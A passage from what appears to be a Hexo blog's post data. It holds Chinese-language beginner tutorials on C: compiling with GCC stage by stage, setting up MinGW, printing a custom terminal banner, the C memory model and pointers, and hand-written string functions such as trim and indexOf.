Compiler。在现在遍地都是IDE的时代，很多开发人员都忘了怎么用cli去编译程序。gcc编译过程是分为四个阶段进行的，即预处理(也称预编译,Preprocessing)、编译(Compilation)、汇编(Assembly)和连接(Linking)。\n<!-- more -->\n#### 预处理\n``` bash\ngcc -E test.c -o test.i\n```\n可以输出test.i文件中存放着test.c经预处理之后的代码。打开test.i文件，看一看，就明白了。\n\n#### 编译\n``` bash\ngcc -S test.i -o test.s\n```\n预处理之后，可直接对生成的test.i文件编译，生成汇编代码。\n\n#### 汇编\n``` bash\ngcc -c test.s -o test.o\n```\n汇编器可以将汇编代码编译为目标文件。\n\n#### 连接\n``` bash\ngcc test.o -o test\n```\ngcc连接器是gas提供的，负责将程序的目标文件与所需的所有附加的目标文件连接起来，最终生成可执行文件。附加的目标文件包括静态连接库和动态连接库。\n\n#### 简单编译\n一步到位:\n``` bash\ngcc test.c -o test\n```\n\n#### 多个程序文件的编译\n通常整个程序是由多个源文件组成的，相应地也就形成了多个编译单元，使用GCC能够很好地管理这些编译单元。\n``` bash\ngcc -c test1.c -o test1.o\ngcc -c test2.c -o test2.o\ngcc test1.o test2.o -o test\n```\n\n## MakeFile\n同样IDE的开发人员估计一般都不知道，IDE都为你做了这个工作。一个软件的代码文件是非常多的，如果你要自己一个个去写编译规则是相当复杂的。那么makefile就是解决整个软件的编译规则。一个软件项目中的源文件不计数，其按类型、功能、模块分别放在若干个目录中，makefile定义了一系列的规则来指定，哪些文件需要先编译，哪些文件需要后编译，哪些文件需要重新编译，甚至于进行更复杂的功能操作。makefile带来的好处就是——“自动化编译”，一旦写好，只需要一个make命令，整个工程完全自动编译，极大的提高了效率。\n\n## MinGW\nMinGW是指只用自由软件来生成纯粹的Win32可执行文件的编译环境，它是Minimalist GNU on Windows的略称。\n\n#### 下载MinGW\n到Sourceforge(http://sourceforge.net/project/showfiles.php?group_id=2435)下载一个MinGW.exe。\n\n#### 环境变量的配置\na.在PATH的值中加入“C:\\MinGW\\bin”。这是寻找gcc编译器的路径。如果PATH中还有其他内容，需要用英文状态下分号进行分割\nb.新建LIBRARY_PATH变量，在其值中加入“C:\\MinGW\\lib”。这是标准库存放的路径。\nc.新建C_INCLUDE_PATH变量，在其值中加入“C:\\MinGW\\include”。这是Include查找头文件的路径。\n\n#### 验证gcc是否正常运行\n在cmd控制台窗口下面,输入gcc -v.若已经成功安装好,会显示gcc的版本信息。","slug":"c-1","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llsm0003g2x67ozpipf0","content":"<h2 id=\"为什么是C\"><a href=\"#为什么是C\" class=\"headerlink\" title=\"为什么是C\"></a>为什么是C</h2><p>很多牛B的开源项目都是C实现的，如redis,nginx,memcache,node等等。主要原因是C语言比较简单(相对C++来说)，编译器稳定可靠。C如果借鉴一些良好设计,C一样可以写的很好，如果习惯了，开发效率未必会比C++低。那么C怎么编译呢?</p>\n<h2 id=\"GCC\"><a href=\"#GCC\" class=\"headerlink\" title=\"GCC\"></a>GCC</h2><p>GCC(GNU Compiler Collection)，GNU编译器集合,是一套由 GNU 开发的编程语言编译器。其中包括了ANSI C Compiler。在现在遍地都是IDE的时代，很多开发人员都忘了怎么用cli去编译程序。gcc编译过程是分为四个阶段进行的，即预处理(也称预编译,Preprocessing)、编译(Compilation)、汇编(Assembly)和连接(Linking)。<br><a id=\"more\"></a></p>\n<h4 id=\"预处理\"><a href=\"#预处理\" class=\"headerlink\" title=\"预处理\"></a>预处理</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -E test.c -o test.i</span><br></pre></td></tr></table></figure>\n<p>可以输出test.i文件中存放着test.c经预处理之后的代码。打开test.i文件，看一看，就明白了。</p>\n<h4 id=\"编译\"><a href=\"#编译\" class=\"headerlink\" title=\"编译\"></a>编译</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -S test.i -o test.s</span><br></pre></td></tr></table></figure>\n<p>预处理之后，可直接对生成的test.i文件编译，生成汇编代码。</p>\n<h4 id=\"汇编\"><a href=\"#汇编\" class=\"headerlink\" title=\"汇编\"></a>汇编</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -c test.s -o test.o</span><br></pre></td></tr></table></figure>\n<p>汇编器可以将汇编代码编译为目标文件。</p>\n<h4 id=\"连接\"><a href=\"#连接\" class=\"headerlink\" title=\"连接\"></a>连接</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc test.o -o <span class=\"built_in\">test</span></span><br></pre></td></tr></table></figure>\n<p>gcc连接器是gas提供的，负责将程序的目标文件与所需的所有附加的目标文件连接起来，最终生成可执行文件。附加的目标文件包括静态连接库和动态连接库。</p>\n<h4 id=\"简单编译\"><a href=\"#简单编译\" class=\"headerlink\" title=\"简单编译\"></a>简单编译</h4><p>一步到位:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc test.c -o <span class=\"built_in\">test</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"多个程序文件的编译\"><a href=\"#多个程序文件的编译\" class=\"headerlink\" title=\"多个程序文件的编译\"></a>多个程序文件的编译</h4><p>通常整个程序是由多个源文件组成的，相应地也就形成了多个编译单元，使用GCC能够很好地管理这些编译单元。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -c <span class=\"built_in\">test</span>1.c -o <span class=\"built_in\">test</span>1.o</span><br><span class=\"line\">gcc -c <span class=\"built_in\">test</span>2.c -o <span class=\"built_in\">test</span>2.o</span><br><span class=\"line\">gcc <span class=\"built_in\">test</span>1.o <span class=\"built_in\">test</span>2.o -o <span class=\"built_in\">test</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"MakeFile\"><a href=\"#MakeFile\" class=\"headerlink\" title=\"MakeFile\"></a>MakeFile</h2><p>同样IDE的开发人员估计一般都不知道，IDE都为你做了这个工作。一个软件的代码文件是非常多的，如果你要自己一个个去写编译规则是相当复杂的。那么makefile就是解决整个软件的编译规则。一个软件项目中的源文件不计数，其按类型、功能、模块分别放在若干个目录中，makefile定义了一系列的规则来指定，哪些文件需要先编译，哪些文件需要后编译，哪些文件需要重新编译，甚至于进行更复杂的功能操作。makefile带来的好处就是——“自动化编译”，一旦写好，只需要一个make命令，整个工程完全自动编译，极大的提高了效率。</p>\n<h2 id=\"MinGW\"><a href=\"#MinGW\" class=\"headerlink\" title=\"MinGW\"></a>MinGW</h2><p>MinGW是指只用自由软件来生成纯粹的Win32可执行文件的编译环境，它是Minimalist GNU on Windows的略称。</p>\n<h4 id=\"下载MinGW\"><a href=\"#下载MinGW\" class=\"headerlink\" title=\"下载MinGW\"></a>下载MinGW</h4><p>到Sourceforge(<a href=\"http://sourceforge.net/project/showfiles.php?group_id=2435)下载一个MinGW.exe。\" target=\"_blank\" rel=\"external\">http://sourceforge.net/project/showfiles.php?group_id=2435)下载一个MinGW.exe。</a></p>\n<h4 id=\"环境变量的配置\"><a href=\"#环境变量的配置\" class=\"headerlink\" title=\"环境变量的配置\"></a>环境变量的配置</h4><p>a.在PATH的值中加入“C:\\MinGW\\bin”。这是寻找gcc编译器的路径。如果PATH中还有其他内容，需要用英文状态下分号进行分割<br>b.新建LIBRARY_PATH变量，在其值中加入“C:\\MinGW\\lib”。这是标准库存放的路径。<br>c.新建C_INCLUDE_PATH变量，在其值中加入“C:\\MinGW\\include”。这是Include查找头文件的路径。</p>\n<h4 id=\"验证gcc是否正常运行\"><a href=\"#验证gcc是否正常运行\" class=\"headerlink\" title=\"验证gcc是否正常运行\"></a>验证gcc是否正常运行</h4><p>在cmd控制台窗口下面,输入gcc -v.若已经成功安装好,会显示gcc的版本信息。</p>\n","excerpt":"<h2 id=\"为什么是C\"><a href=\"#为什么是C\" class=\"headerlink\" title=\"为什么是C\"></a>为什么是C</h2><p>很多牛B的开源项目都是C实现的，如redis,nginx,memcache,node等等。主要原因是C语言比较简单(相对C++来说)，编译器稳定可靠。C如果借鉴一些良好设计,C一样可以写的很好，如果习惯了，开发效率未必会比C++低。那么C怎么编译呢?</p>\n<h2 id=\"GCC\"><a href=\"#GCC\" class=\"headerlink\" title=\"GCC\"></a>GCC</h2><p>GCC(GNU Compiler Collection)，GNU编译器集合,是一套由 GNU 开发的编程语言编译器。其中包括了ANSI C Compiler。在现在遍地都是IDE的时代，很多开发人员都忘了怎么用cli去编译程序。gcc编译过程是分为四个阶段进行的，即预处理(也称预编译,Preprocessing)、编译(Compilation)、汇编(Assembly)和连接(Linking)。<br>","more":"</p>\n<h4 id=\"预处理\"><a href=\"#预处理\" class=\"headerlink\" title=\"预处理\"></a>预处理</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -E test.c -o test.i</span><br></pre></td></tr></table></figure>\n<p>可以输出test.i文件中存放着test.c经预处理之后的代码。打开test.i文件，看一看，就明白了。</p>\n<h4 id=\"编译\"><a href=\"#编译\" class=\"headerlink\" title=\"编译\"></a>编译</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -S test.i -o test.s</span><br></pre></td></tr></table></figure>\n<p>预处理之后，可直接对生成的test.i文件编译，生成汇编代码。</p>\n<h4 id=\"汇编\"><a href=\"#汇编\" class=\"headerlink\" title=\"汇编\"></a>汇编</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -c test.s -o test.o</span><br></pre></td></tr></table></figure>\n<p>汇编器可以将汇编代码编译为目标文件。</p>\n<h4 id=\"连接\"><a href=\"#连接\" class=\"headerlink\" title=\"连接\"></a>连接</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc test.o -o <span class=\"built_in\">test</span></span><br></pre></td></tr></table></figure>\n<p>gcc连接器是gas提供的，负责将程序的目标文件与所需的所有附加的目标文件连接起来，最终生成可执行文件。附加的目标文件包括静态连接库和动态连接库。</p>\n<h4 id=\"简单编译\"><a href=\"#简单编译\" class=\"headerlink\" title=\"简单编译\"></a>简单编译</h4><p>一步到位:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc test.c -o <span class=\"built_in\">test</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"多个程序文件的编译\"><a href=\"#多个程序文件的编译\" class=\"headerlink\" title=\"多个程序文件的编译\"></a>多个程序文件的编译</h4><p>通常整个程序是由多个源文件组成的，相应地也就形成了多个编译单元，使用GCC能够很好地管理这些编译单元。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -c <span class=\"built_in\">test</span>1.c -o <span class=\"built_in\">test</span>1.o</span><br><span class=\"line\">gcc -c <span class=\"built_in\">test</span>2.c -o <span class=\"built_in\">test</span>2.o</span><br><span class=\"line\">gcc <span class=\"built_in\">test</span>1.o <span class=\"built_in\">test</span>2.o -o <span class=\"built_in\">test</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"MakeFile\"><a href=\"#MakeFile\" class=\"headerlink\" title=\"MakeFile\"></a>MakeFile</h2><p>同样IDE的开发人员估计一般都不知道，IDE都为你做了这个工作。一个软件的代码文件是非常多的，如果你要自己一个个去写编译规则是相当复杂的。那么makefile就是解决整个软件的编译规则。一个软件项目中的源文件不计数，其按类型、功能、模块分别放在若干个目录中，makefile定义了一系列的规则来指定，哪些文件需要先编译，哪些文件需要后编译，哪些文件需要重新编译，甚至于进行更复杂的功能操作。makefile带来的好处就是——“自动化编译”，一旦写好，只需要一个make命令，整个工程完全自动编译，极大的提高了效率。</p>\n<h2 id=\"MinGW\"><a href=\"#MinGW\" class=\"headerlink\" title=\"MinGW\"></a>MinGW</h2><p>MinGW是指只用自由软件来生成纯粹的Win32可执行文件的编译环境，它是Minimalist GNU on Windows的略称。</p>\n<h4 id=\"下载MinGW\"><a href=\"#下载MinGW\" class=\"headerlink\" title=\"下载MinGW\"></a>下载MinGW</h4><p>到Sourceforge(<a href=\"http://sourceforge.net/project/showfiles.php?group_id=2435)下载一个MinGW.exe。\">http://sourceforge.net/project/showfiles.php?group_id=2435)下载一个MinGW.exe。</a></p>\n<h4 id=\"环境变量的配置\"><a href=\"#环境变量的配置\" class=\"headerlink\" title=\"环境变量的配置\"></a>环境变量的配置</h4><p>a.在PATH的值中加入“C:\\MinGW\\bin”。这是寻找gcc编译器的路径。如果PATH中还有其他内容，需要用英文状态下分号进行分割<br>b.新建LIBRARY_PATH变量，在其值中加入“C:\\MinGW\\lib”。这是标准库存放的路径。<br>c.新建C_INCLUDE_PATH变量，在其值中加入“C:\\MinGW\\include”。这是Include查找头文件的路径。</p>\n<h4 id=\"验证gcc是否正常运行\"><a href=\"#验证gcc是否正常运行\" class=\"headerlink\" title=\"验证gcc是否正常运行\"></a>验证gcc是否正常运行</h4><p>在cmd控制台窗口下面,输入gcc -v.若已经成功安装好,会显示gcc的版本信息。</p>"},{"title":"C语言之个性化termial","date":"2016-03-23T16:00:00.000Z","desc":"gcc 个性化cmd 个性化terminal","_content":"很多牛人有自己的个性化的命令行，为什么我没有呢?晚上我就写了一个。效果如下:\n![效果](/img/c-1.png)\n<!-- more -->\n## 图形实现\n图形是使用C打出来的，就当练手。\n``` C\n#include <stdio.h>\n#include <stdlib.h>\nint main(void)\n{\n    int i,j;\n    for (i=0; i<6; i++) {\n        for (j=6;j>i ;j-- ) {\n            printf(\" \");\n        }\n        for (j=0; j<=i; j++) {\n            printf(\"*\");\n        }\n        if (i==5)\n            printf(\"    write by binyanbin\");\n        else\n            printf(\"\\n\");\n    }\n    system(\"c:\");\n}\n```\n然后用gcc编译成exe。\n\n## cmd快捷方式\n新建快捷方式，输入C:\\Windows\\System32\\cmd.exe /k \"C:\\yanbin\\mycmd.exe\"。最后为你编译exe的位置。\n![cmd快捷方式](/img/c-2.png)\n这个cmd快捷方式就是你的个性terminal，当然你也可以打印出更漂亮的图形做你的terminal。\n\n\n","source":"_posts/c-2.md","raw":"---\ntitle: C语言之个性化termial\ndate: 2016-3-24\ndesc: gcc 个性化cmd 个性化terminal\n---\n很多牛人有自己的个性化的命令行，为什么我没有呢?晚上我就写了一个。效果如下:\n![效果](/img/c-1.png)\n<!-- more -->\n## 图形实现\n图形是使用C打出来的，就当练手。\n``` C\n#include <stdio.h>\n#include <stdlib.h>\nint main(void)\n{\n    int i,j;\n    for (i=0; i<6; i++) {\n        for (j=6;j>i ;j-- ) {\n            printf(\" \");\n        }\n        for (j=0; j<=i; j++) {\n            printf(\"*\");\n        }\n        if (i==5)\n            printf(\"    write by binyanbin\");\n        else\n            printf(\"\\n\");\n    }\n    system(\"c:\");\n}\n```\n然后用gcc编译成exe。\n\n## cmd快捷方式\n新建快捷方式，输入C:\\Windows\\System32\\cmd.exe /k \"C:\\yanbin\\mycmd.exe\"。最后为你编译exe的位置。\n![cmd快捷方式](/img/c-2.png)\n这个cmd快捷方式就是你的个性terminal，当然你也可以打印出更漂亮的图形做你的terminal。\n\n\n","slug":"c-2","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llsn0004g2x6kzbu73pb","content":"<p>很多牛人有自己的个性化的命令行，为什么我没有呢?晚上我就写了一个。效果如下:<br><img src=\"/img/c-1.png\" alt=\"效果\"><br><a id=\"more\"></a></p>\n<h2 id=\"图形实现\"><a href=\"#图形实现\" class=\"headerlink\" title=\"图形实现\"></a>图形实现</h2><p>图形是使用C打出来的，就当练手。<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i,j;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">6</span>; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j=<span class=\"number\">6</span>;j&gt;i ;j-- ) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>; j&lt;=i; j++) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"*\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i==<span class=\"number\">5</span>)</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"    write by binyanbin\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    system(<span class=\"string\">\"c:\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>然后用gcc编译成exe。</p>\n<h2 id=\"cmd快捷方式\"><a href=\"#cmd快捷方式\" class=\"headerlink\" title=\"cmd快捷方式\"></a>cmd快捷方式</h2><p>新建快捷方式，输入C:\\Windows\\System32\\cmd.exe /k “C:\\yanbin\\mycmd.exe”。最后为你编译exe的位置。<br><img src=\"/img/c-2.png\" alt=\"cmd快捷方式\"><br>这个cmd快捷方式就是你的个性terminal，当然你也可以打印出更漂亮的图形做你的terminal。</p>\n","excerpt":"<p>很多牛人有自己的个性化的命令行，为什么我没有呢?晚上我就写了一个。效果如下:<br><img src=\"/img/c-1.png\" alt=\"效果\"><br>","more":"</p>\n<h2 id=\"图形实现\"><a href=\"#图形实现\" class=\"headerlink\" title=\"图形实现\"></a>图形实现</h2><p>图形是使用C打出来的，就当练手。<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i,j;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">6</span>; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j=<span class=\"number\">6</span>;j&gt;i ;j-- ) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>; j&lt;=i; j++) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"*\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i==<span class=\"number\">5</span>)</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"    write by binyanbin\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    system(<span class=\"string\">\"c:\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>然后用gcc编译成exe。</p>\n<h2 id=\"cmd快捷方式\"><a href=\"#cmd快捷方式\" class=\"headerlink\" title=\"cmd快捷方式\"></a>cmd快捷方式</h2><p>新建快捷方式，输入C:\\Windows\\System32\\cmd.exe /k “C:\\yanbin\\mycmd.exe”。最后为你编译exe的位置。<br><img src=\"/img/c-2.png\" alt=\"cmd快捷方式\"><br>这个cmd快捷方式就是你的个性terminal，当然你也可以打印出更漂亮的图形做你的terminal。</p>"},{"title":"C语言之由内存模型说起","date":"2016-03-24T16:00:00.000Z","desc":"内存模型 内存管理 指针 字符串","_content":"说起内存模型，那就先要介绍程序运行时是如何管理内存的。\n程序运行时:\n* 系统先把物理硬盘代码load到内存\n* 系统再把c代码分成四个区\n* 系统再找到main函数入口执行\n## 程序的四区模型\n![效果](/img/c-3.png)\n<!-- more -->\n一个由C编译的程序的内存分配通常由以下几块组成:\n1 栈区(stack)由编译器自动分配释放,存放函数的参数值,局部变量的值等。其操作方式类似于数据结构中的栈。\n2 堆区(heap):一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回收。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。\n3 全局区：主要包括静态全局区和常量区，程序结束后由系统释放。\n静态区(static):全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域,未初始化的全局变量和未初始化的静态变量在相邻的另一块区域。\n常量区:常量字符串就是放在这里的。\n4 代码区：存放函数体的二进制代码。\n示例:\n``` C\nchar*fa()\n{\n    char*pa = \"123456\";//pa指针在栈区，“123456”在常量区，该函数调用完后指针变量pa就被释放了\n    char*p = NULL;//指针变量p在栈中分配4字节\n    p=(char*)malloc(100);//本函数在这里开辟了一块堆区的内存空间，并把地址赋值给p\n    strcpy(p, \"wudunxiong 1234566\");//把常量区的字符串拷贝到堆区\n    return p;//返回给主调函数fb()，相对fa来说fb是主调函数，相对main来说，fa(),fb()都是被调用函数\n}\n```\n由此可以得知，当一个程序运行时，他的全局区，代码区基本是固定不变的，堆区与全局区和代码区均由系统控制。开发人员需对堆区内存进行管理。在现代开发语言(java,c#,javascript等)里,堆区内存管理都是由垃圾回收器处理的。\n\n## 内存管理基础:指针\n指针是一个变量,其值为另一个变量的地址,即内存位置的直接地址。就像其他变量或常量一样,您必须在使用指针存储其他变量地址之前,对其进行声明。指针变量声明的一般形式为：type *var-name;\n示例如下:\n``` C\n#include <stdio.h>\nint main ()\n{\n   int  var = 20;   /* 实际变量的声明 */\n   int  *ip;        /* 指针变量的声明 */\n   ip = &var;  /* 在指针变量中存储 var 的地址 */\n   printf(\"Address of var variable: %x\\n\", &var  );\n   /* 在指针变量中存储的地址 */\n   printf(\"Address stored in ip variable: %x\\n\", ip );\n   /* 使用指针访问值 */\n   printf(\"Value of *ip variable: %d\\n\", *ip );\n   return 0;\n}\n```\n## 字符串\n在C语言中,字符串实际上是使用null字符 '\\0' 终止的一维字符数组.因此,一个以null尾的字符串,包含了组成字符串的字符.\n下面的声明和初始化创建了一个\"Hello\"字符串.由于在数组的末尾存储了空字符,所以字符数组的大小比单词\"Hello\"的字符数多一个。\n![效果](/img/c-4.jpg)\n\nc语言标准库没有常用的字符串方法，如indexOf,lastIndexOf,trim,lTrim,rTrim等方法。如是我就自己尝试实现，中间用了几个标准库函数:strcpy字符串拷贝，strcat字符串连接，这个方法不能直接用，C中的字符串内存不是自动扩展需要自己申请,strcat是把第二个字符串copy到第一个字符串结尾，需要第一个字符串分配的内存足够多，不然无法连接。strstr查找相同的字符串，返回的又是地址。整个代码全是内存操作，自已申请的内存一定要记得释放，对于用惯了现代语言的人来说，这真是相当虐心啊。\n![效果](/img/c-5.jpg)\n还是看代码吧\n``` C\n#include <string.h>\n#include <stdio.h>\n#include <stdlib.h> \nint main(void)\n{\n    ///方法定义\n    char* join(char  *s1,char *s2);\n    int indexOf(char *str1,char *str2);\n    int lastIndexOf(char *str1,char *str2);\n    char* ltrim(char *str);\n    char* rtrim(char *str);\n    char* trim(char *str);\n    //测试数据准备\n    char *first;\n    char *second;\n    char *indexstr;\n    char *third;\n    char *show;\n    first = \"binyanbin website is \";\n    second = \"http://binyanbin.github.io\";\n    indexstr = \"bin\";\n    third = \"  binyanbin trim test \";\n    //测试结果输出\n    show = join(first,second);\n    printf(\"join(\\\"%s\\\",\\\"%s\\\")=\\\"%s\\\"\\n\",first,second,show);\n    free(show);\n    printf(\"indexOf(\\\"%s\\\",\\\"%s\\\")=%d\\n\",second,indexstr,indexOf(second,indexstr));\n    printf(\"lastIndexOf(\\\"%s\\\",\\\"%s\\\")=%d\\n\",second,indexstr,lastIndexOf(second,indexstr));\n    show = ltrim(third);\n    printf(\"ltrim(\\\"%s\\\")=\\\"%s\\\"\\n\",third,show);\n    free(show);\n    show = rtrim(third);\n    printf(\"rtrim(\\\"%s\\\")=\\\"%s\\\"\\n\",third,show);\n    show = trim(third);\n    printf(\"trim(\\\"%s\\\")=\\\"%s\\\"\",third,show);\n    free(show);\n}\n\n//字符串连接\nchar* join(char  *s1,char *s2)\n{\n    //分布内存\n    char *result = malloc(strlen(s1)+strlen(s2)+1);\n    if (result==NULL) \n        exit(0);//内存为空退出\n    //拷贝s1到result\n    strcpy(result, s1);\n    //s2加到result尾部  \n    strcat(result, s2);  \n    return result;  \n}\n//字符串查询最开始位置\nint indexOf(char *str1,char *str2)  \n{  \n    char *p=str1;  \n    int i=0;  \n    //p是一个地址，找到相同字符串的地址\n    p=strstr(str1,str2);  \n    if(p==NULL)  \n        return -1;  \n    else{  \n        //是不是同一个地址了，是同一地址则找到字符串\n        while(str1!=p)\n        {  \n            str1++;  \n            i++;  \n        }  \n    }  \n    return i;  \n} \n\n//查询最后位置\nint lastIndexOf(char *str1,char *str2)  \n{  \n    char *p=str1;  \n    int i=0;\n    int len=strlen(str2);  \n    p=strstr(str1,str2);  \n    if(p==NULL)return -1;\n    //未找到字符串地址为空则跳出循环  \n    while(p!=NULL)  \n    { \n        //跳过已找的地址 \n        for(;str1!=p;str1++)\n            i++;  \n        p=p+len;\n        //找出下一个同样字符串的地址  \n        p=strstr(p,str2);  \n    }  \n    return i;  \n} \n\n//删除左空格 \nchar* ltrim(char *param)  \n{\n    //申请存储，不修改参数内存的数据\n    char *str = malloc(strlen(param)+1); \n    strcpy(str, param); \n    int i=0,j,len=strlen(str);  \n    while(str[i]!='\\0')  \n    {\n        //32:空格,9:横向制表符\n        if(str[i]!=32&&str[i]!=9)\n            break;\n        i++;  \n    }  \n    if(i!=0)  \n    //将后面的字符顺势前移,补充删掉的空白位置\n    for(j=0;j<=len-i;j++)  \n    {     \n        str[j]=str[j+i];\n    }  \n    return str; \n}  \n//删除右空格\nchar* rtrim(char *param)  \n{\n    char *str = malloc(strlen(param)+1);    \n    strcpy(str, param); \n    char *p=str;  \n    int i=strlen(str)-1;  \n    while(i>=0)  \n    {  \n        if(p[i]!=32&&p[i]!=9)\n            break;  \n        i--;  \n    }  \n    str[++i]='\\0';\n    return str;  \n}\n//删除左右空格\nchar* trim(char *str)\n{\n    char* temp = ltrim(str);\n    char* result = rtrim(temp);\n    free(temp);\n    return result;\n}  \n```\n","source":"_posts/c-3.md","raw":"---\ntitle: C语言之由内存模型说起\ndate: 2016-3-25\ndesc: 内存模型 内存管理 指针 字符串\n---\n说起内存模型，那就先要介绍程序运行时是如何管理内存的。\n程序运行时:\n* 系统先把物理硬盘代码load到内存\n* 系统再把c代码分成四个区\n* 系统再找到main函数入口执行\n## 程序的四区模型\n![效果](/img/c-3.png)\n<!-- more -->\n一个由C编译的程序的内存分配通常由以下几块组成:\n1 栈区(stack)由编译器自动分配释放,存放函数的参数值,局部变量的值等。其操作方式类似于数据结构中的栈。\n2 堆区(heap):一般由程序员分配释放， 